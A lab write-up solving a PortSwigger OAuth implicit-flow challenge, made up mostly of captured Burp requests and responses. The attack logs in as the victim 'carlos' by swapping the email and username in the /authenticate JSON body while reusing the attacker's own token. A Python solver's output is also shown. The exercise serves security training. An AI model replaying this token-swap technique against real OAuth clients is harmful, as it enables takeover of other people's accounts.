# Lab: Authentication bypass via OAuth implicit flow

### Instructions

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.

You can log in with your own social media account using the following credentials: `wiener:peter`. 

### Solution

Clicking on the My Account button to login to the app we receive the message:

```
We are now redirecting you to login with social media...
```

This takes us to a login screen at:

```
https://oauth-0a7800d40439130980fb01e302710073.oauth-server.net/interaction/lMbGbsf0dM2cpy8uhTMxe
```

And we can login with the provided credentials.

Here we get the message:

```
    WeLikeToBlog is requesting access to:
        Profile
        Email
```

Capturing these requests in Burp we get the following request:

```
GET /auth?client_id=biz26y78xtne7vj2ncurc&redirect_uri=https://0a0500b3048713a680310395002900d0.web-security-academy.net/oauth-callback&response_type=token&nonce=1333465120&scope=openid%20profile%20email HTTP/2
Host: oauth-0a7800d40439130980fb01e302710073.oauth-server.net
Cookie: _session=7vOj87vwoBLerRD30OM2D; _session.legacy=7vOj87vwoBLerRD30OM2D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Priority: u=0, i
Te: trailers
```

Continuing to follow requests and responses we intercept the following request:

```
POST /authenticate HTTP/2
Host: 0a0500b3048713a680310395002900d0.web-security-academy.net
Cookie: session=CBCJoKN7uf06gEnbOCL6aY0OVqbkIFYP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0500b3048713a680310395002900d0.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0a0500b3048713a680310395002900d0.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

{"email":"wiener@hotdog.com","username":"wiener","token":"8v1F4i9rmiNhYMRfHh6yPCiMt435xX60sbrq9cRc_HX"}
```

Here the token is being passed.. let's send this to Repeater for testing.

We can update the email and user, keeping the same token in place:

```json
   {"email":"carlos@carlos-montoya.net","username":"carlos","token":"8v1F4i9rmiNhYMRfHh6yPCiMt435xX60sbrq9cRc_HX"}
```

This returns:

```
HTTP/2 302 Found
Location: /
Set-Cookie: session=oBx7pKpKXaodVTqyrjzRylzefLphK9EL; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

We can either use Burp to "show response in browser" or simply paste the cookie into a cookie editor to login as carlos and to solve the lab.


### Python Solution

See `oauth_01.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/OAuth_Authentication/OAuth_01_authentication_bypass_via_oauth_implicit_flow]
└─$ python oauth_01.py https://0aee00ab0438d8ff80b4c61900820016.web-security-academy.net/
[+] Found OAuth link: https://oauth-0ac700a904e5d8d280edc4ea028c00f0.oauth-server.net/auth?client_id=i8334n3n24nr7fvy1oi3p&redirect_uri=https://0aee00ab0438d8ff80b4c61900820016.web-security-academy.net/oauth-callback&response_type=token&nonce=1157923419&scope=openid%20profile%20email
[+] Confirmed OAuth access request
[+] Got access token: r2VPpsknl8pCzBfAJM7sHTwdl2cawPKkWitFc6jTFH4
[+] Authenticated as carlos
[+] Lab solved!
```